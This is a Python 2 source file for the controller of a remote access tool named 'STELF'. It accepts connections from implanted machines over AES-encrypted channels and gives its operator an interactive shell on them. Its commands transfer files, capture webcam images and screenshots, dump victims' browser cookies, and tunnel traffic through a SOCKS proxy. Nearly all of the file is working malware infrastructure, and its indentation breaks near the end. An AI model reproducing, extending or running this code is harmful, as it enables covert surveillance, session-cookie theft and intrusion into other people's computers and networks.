#!/usr/bin/env python2

import socket
import Queue
import os
import threading
import logging
import time
import sys
import readline
from colorama import init, Fore, Style
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib
from PIL import Image
import json
import argparse

import __builtin__ 

def raw_input2(prompt=''): 
	try: 
		return raw_input1(prompt) 
	except EOFError as exc: 
		time.sleep(0.05) 
		raise 

raw_input1 = raw_input 
__builtin__.raw_input = raw_input2

init(autoreset=True)

INFO = Style.BRIGHT + Fore.BLUE + "[*] " + Style.RESET_ALL
BAD = Style.BRIGHT + Fore.RED + "[-] " + Style.RESET_ALL
GOOD = Style.BRIGHT + Fore.GREEN + "[+] " + Style.RESET_ALL

def print_info(data): print INFO + data
def print_bad(data): print BAD + data
def print_good(data): print GOOD + data

logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
logging.critical("\n--------------------START OF NEW LOG--------------------\n")

parser = argparse.ArgumentParser(description='Awesome shell')
parser.add_argument('-l','--lhost', metavar='<address>', help='address to listen on', action='store', default="0.0.0.0")
parser.add_argument('-p','--port', metavar='<port>', help='port to listen on', action='store', default=8080, type=int)
args = parser.parse_args()

class ProxyConnection:
	"""
	Represents a connection to the shell's socks proxy.
	"""
	def __init__(self, channel, client):
		self.channel = channel
		self.client = client
		self.disconnected = False
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		for f in [self.local_to_remote, self.remote_to_local]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
	def local_to_remote(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.client.recv(4096)
			if not data:
				self.disconnected = True
				return
			self.send(data)
			
	def remote_to_local(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			self.client.sendall(data)		

class ProxyListener:
	"""
	This class sets up a listening port specified by the user. Upon receiving a connection, it creates a new channel, then starts the socksv4 proxy on it.
	"""
	def __init__(self, client, port):
		logging.debug("New proxy listener created for client #"+str(client.id))
		self.client = client
		self.sock = socket.socket()
		self.sock.bind(("0.0.0.0",port))
		self.sock.listen(5)
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		ct = threading.currentThread()
		while not ct.stopped():
			local_client, addr = self.sock.accept()
			logging.debug("New proxy connection")
			channel = self.client.transport.create_channel()
			self.client.transport.signal("CREATE_CHANNEL:"+channel.id)
			time.sleep(0.2)
			self.client.transport.signal("CREATE_PROXY:"+channel.id)
			ProxyConnection(channel, local_client)
			
class PortForwarder:
	def __init__(self, host, port, channel):
		self.remote_host = host
		self.remote_port = port
		self.channel = channel
			
class StoppableThread(threading.Thread):
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(id)))

	def write_input(self, data): # This function is used to feed data into a channel.
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
		self.input_queue.put(data)
		
	def read_input(self, blocking=True): # This function is used to read data from a channel.
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
			return data
		except Queue.Empty: return None
		
	def write_output(self, data): # This function is used to send data to the handler.
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip()[:100])
		self.output_queue.put(self.id+data)
		
	def write_wait(self, data):
		self.output_queue.put(self.id+data)
		while not self.output_queue.empty(): time.sleep(1)
		
	def __repr__(self):
		print "Channel ID: "+str(ord(self.id))
	
class Transport:
	def __init__(self, sock, addr, port, id, aes_obj, client):
		self.client_id = id
		self.address = addr
		self.port = port
		self.client = client
		
		self.comm_socket = sock
		
		self.aes_obj = aes_obj
		
		self.master_queue = Queue.Queue() # Data that has to be sent is put on this queue.
		self.user_channel = Channel(chr(97), self.master_queue) # Channel for user input and shell output.
		self.signal_channel = Channel(chr(254), self.master_queue) # Channel used for signalling: Requesting new channels, etc.
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}
		self.free_channel_id = 1
		
		self.disconnected = False
		
		for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
		logging.debug("Created new transport for client #"+str(self.client_id))
		
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data+chr(255))
		except: pass
		
	def recv(self):
		if self.disconnected: return ""
		
		try:
			data = ""
			while not data.endswith(chr(255)):
				data += self.comm_socket.recv(4096)
			data = data[:-1]
		except: data = ""
		
		if not data:
			self.comm_socket.close()
			logging.error("Client #"+str(self.client_id)+" disconnected")
			self.disconnected = True
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to client #"+str(self.client_id)+": "+data[1:][:100])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from client #"+str(self.client_id)+": "+data.strip()[:100])
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip()[:100])
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal[:100])
			if signal == "CREATE_CHANNEL":
				id = signal.split(":")[1]
				self.create_channel(id)
				
			elif signal == "NEW_SESH":
				self.user_channel.write_input("AWAIT_NEW_SESH")
				
			elif signal.startswith("STATUS"):
				status = ":".join(signal.split(":")[1:])
				status = status.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
				print status
				
	def signal(self, data):
		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data[:100])
		self.master_queue.put(self.signal_channel.id+data)
				
	def create_channel(self, id=None):
		if not id:
			id = chr(self.free_channel_id)
			self.free_channel_id += 1
			if self.free_channel_id == ord(":"): self.free_channel_id += 1 # Signal data separator
			chan = Channel(id, self.master_queue)
			self.channels[id] = chan
			self.signal("CREATE_CHANNEL:"+chan.id)
			return chan
		else:
			self.channels[id] = Channel(id, self.master_queue)
		
		
class Client:
	"""
	Represents a connected client.
	"""
	def __init__(self, id, cli, ip, port, aes_obj, hostname, admin, handler):
		self.transport = Transport(cli, ip, port, id, aes_obj, self)
		self.id = id
		self.proxy_listener = None

		self.ip = ip
		self.hostname = hostname
		self.admin_privs = admin
		
		self.handler = handler
		self.interacting = False
		
	def send(self, data):
		self.transport.user_channel.write_output(data)
		
	def recv(self):
		return self.transport.user_channel.read_input()
		
	def signal(self, data):
		return self.transport.signal(data)
		
	def download(self, path):
		logging.info("Starting download of file: "+path)

		with open(path, "wb") as f:
			print_info("Starting download...")
			data = base64.b64decode(self.recv())
			if data.startswith("Error:"):
				logging.error("Could not download file: "+data)
				print_bad(data)

			else:
				f.write(data)
				while True:
					data = base64.b64decode(self.recv())
					if data.endswith(chr(255)):
						data = data[:-1]
						if not data: break
						f.write(data)
						break
					f.write(data)
				logging.info("Download complete.")
				print_good("Download complete!")
				
	def upload(self, path):
		logging.info("Starting upload of file: "+path)
		if not os.path.isfile(path):
			print_bad("No such file: "+path)
			self.send(base64.b64decode(chr(255)))
			return

		with open(path, "rb") as f:
			while True:
				data = f.read(8192)
				if not data: break
				self.send(base64.b64encode(data))
				time.sleep(0.1)

		self.send(base64.b64encode(chr(255)))
		print_good("Upload complete!")
		
	def display_snap(self, screenie=False):
		data = ""
		while not data.endswith(">>"):
			data += self.recv()
			
		data = data[:-3]
		
		img_data, width, height, junk = data.split("|")
		width, height = int(width), int(height)
		img_data = base64.b64decode(img_data)
		
		if not screenie: Image.frombytes('RGB', (width, height), img_data, 'raw', 'BGR', 0, -1).show()
		else: Image.frombytes('RGB', (width, height), img_data, 'raw', 'RGB', 0, 0).show()
		
		return

	def save_cookies(self):
		cookies = self.recv().split(chr(1))[0]
		with open("cookies_"+self.hostname, "w") as f:
			f.write(cookies)
		print_good("Cookies saved locally to cookies_"+self.hostname)
		return

	def interact(self):
		self.interacting = True
		logging.info("Starting interaction with client #"+str(self.id))
		self.send("cd .")
		cwd = self.recv()
		if cwd == "CONN_LOST":
			print_bad("Client Disconnected")
			return False			
		sys.stdout.write(cwd)
			
		while True:
			try:
				user_input = raw_input()
			except KeyboardInterrupt:
				print ""
				print_info("Backgrounding session.")
				return True
				
			if not user_input: continue
			logging.debug("Got user input: "+user_input)
			
			if user_input.startswith("proxy start"):
				try:
					port = int(user_input.split()[2])
					self.proxy_listener = ProxyListener(self, port)
					user_input = "cd ."
				except:
					print_bad("Invalid argument")
					
			if user_input.startswith("download"):
				self.send(user_input)
				self.download(user_input.split()[1])
				user_input = "cd ."
				
			if user_input.startswith("upload"):
				self.send(user_input)
				self.upload(user_input.split()[1])
				user_input = "cd ."
				
			elif user_input.startswith("webcam snap"):
				self.send(user_input)
				self.display_snap()
				user_input = "cd ."
				
			elif user_input == "screenshot":
				self.send(user_input)
				self.display_snap(screenie=True)
				user_input = "cd ."
				
			elif user_input in ["dumpcookies","cookiemonster","OM NOM NOM"]:
				self.send(user_input)
				self.save_cookies()
				user_input = "cd ."

			self.send(user_input)
			
			data = self.recv()
			logging.debug("Result of user input: "+data)
			if data == "CONN_LOST":
				print_bad("Client Disconnected")
				return False

			elif data.startswith("AWAIT_NEW_SESH"):
				print_info("Waiting for new session...")
				self.handler.awaiting_session = True
				return True
				
			data = data.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
			sys.stdout.write(data)
		
class Handler:
	"""
	Main handler class. Sets up a socket for clients to connect to.
	"""
	def __init__(self, bind_addr, bind_port):
		self.bind_addr = bind_addr
		self.bind_port = bind_port
		self.sock = socket.socket()
		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.sock.bind((bind_addr, bind_port))
		self.sock.listen(5)
	
		self.clients = []

		self.interacting = False
		self.current_id = 0
		self.dup_session = None
		self.awaiting_session = False
		self.session_on_hold = None
		
		with open("stelf.guid","rb") as f:
			self.auth_key = f.read()
		
	def dh_exchange(self, client):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		client_key = client.recv(4096)
		client.sendall(str(public_key))
		
		sharedSecret = pow(int(client_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(str(sharedSecret)+str(self.auth_key)+str(client.getpeername()[1]))).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
		
	def accepter(self):
		ct = threading.currentThread()
		while not ct.stopped():
			try:
				cli, addr = self.sock.accept()
				logging.info("New client connection")
				address, port = addr
				
				id = self.current_id
				self.current_id += 1
				
				data = cli.recv(4096)
				logging.debug("Received data: "+data.strip())
				if data.startswith("GET"): continue
				
				aes = self.dh_exchange(cli)
				
				hostname, admin = cli.recv(4096).split("|")
				c = Client(id, cli, address, port, aes, hostname, admin, self)

				for client in self.clients:
					if client.hostname == hostname and client.ip == address and not self.interacting and self.awaiting_session:
						print_good("Attaching to new session")
						self.dup_session = c

				self.clients.append(c)
				
				if not self.interacting and not self.awaiting_session:
					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
					print_info("STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n")
					sys.stdout.write(Style.BRIGHT + Fore.RED + "stelf" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
					sys.stdout.flush()
			except Exception as e:
				logging.info("A client connected, but disconnected before finishing the handshake.")
	
	def conn_check(self):
		ct = threading.currentThread()
		while not ct.stopped():
			try:
				for client in self.clients:
					if not client.interacting:
						client.send("PING")
						response = client.recv().split("\n")[0]

						if response != "PONG":
							sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
							print_bad("STELF session " + str(client.id) + " disconnected.\n")
							sys.stdout.write(Style.BRIGHT + Fore.RED + "stelf" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
							sys.stdout.flush()

							self.clients.remove(client)
				time.sleep(5)
			except Exception as e:
				logging.info("There was an error trying to ping a client.")
			
			time.sleep(0.5)

	def run(self):
		t = StoppableThread(target=self.accepter)
		cc = StoppableThread(target=self.conn_check)
		t.daemon = True
		cc.daemon = True
		t.start()
		cc.start()
		while True:
			if self.awaiting_session:
				for i in range(90):
					if self.dup_session:
						self.interacting = True
						self.session_on_hold = None
						self.awaiting_session = False
						print_good("Starting interaction with session "+str(self.dup_session.id))
						if not self.dup_session.interact():
							self.clients.remove(self.dup_session)
						self.dup_session.interacting = False
						self.dup_session = None
						break
					else: time.sleep(1)
				
				if not self.interacting:
					print_bad("No new sessions connected, returning to initial session...")
					self.interacting = True
					self.awaiting_session = False
					self.session_on_hold.interact()
					self.session_on_hold.interacting = False
					self.session_on_hold = None
					
				self.interacting = False
				continue
				
			try: user_input = raw_input(Style.BRIGHT + Fore.RED + "stelf" + Style.RESET_ALL + ">> ")
			except KeyboardInterrupt:
				print "\n" + GOOD + "Bye!"
				os._exit(0) # What is a graceful exit
				
			if user_input == "list" or user_input == "l":
				print_info("Current active sessions:")
				print "========================"
				for c in self.clients:
					print "["+str(c.id)+"]: " + c.transport.address + ":" + str(c.transport.port)+" Hostname: "+c.hostname+", Admin: "+c.admin_privs
					
				print "========================"
				
			elif user_input.startswith("i"):
				self.interacting = True
				try:
					the_chosen_one = [c for c in self.clients if c.id == int(user_input.split()[1])][0] # too lazy to make it properly
				except:
					print_bad("No such client.")
					continue
				if not the_chosen_one.interact():
					self.clients.remove(the_chosen_one)
				else:
					the_chosen_one.interacting = False
					if self.awaiting_session:
						self.session_on_hold = the_chosen_one
				self.interacting = False
				
			elif user_input == "help":
				print_info("Available commands:")
				print "(i)nteract [id] - Interact with client."
				print "(l)ist - Print list of clients."
print ""	
print Style.BRIGHT+Fore.RED+r"  ____"+ r"______"+r"___"+ r" __   "+" ___ "+Style.RESET_ALL+"   /\\"
print Style.BRIGHT+Fore.RED+r" / __|"+ r"_   _|"+r" __|"+ r"  |"+"  | __|"+Style.RESET_ALL+"  /__\\"
print Style.BRIGHT+Fore.RED+" \\__ \\"+r" | | "+r"| __|"+ r"  |__"+"| _| "+Style.RESET_ALL+" /\\  /\\"
print Style.BRIGHT+Fore.RED+r" |___/"+ r" |_| "+r"|___|"+ r"____|"+"|_|  "+Style.RESET_ALL+"/__\\/__\\"
print Style.RESET_ALL
				
if not os.path.isfile("stelf.guid"):
	print_info("Generating secret for authentication, it will be stored in 'stelf.guid'")
	with open("stelf.guid", "wb") as f:
		f.write(hashlib.sha512(str(random.randrange(10**100, (10**101)-1))).hexdigest()[:30])
		
handler = Handler(args.lhost,args.port).run()
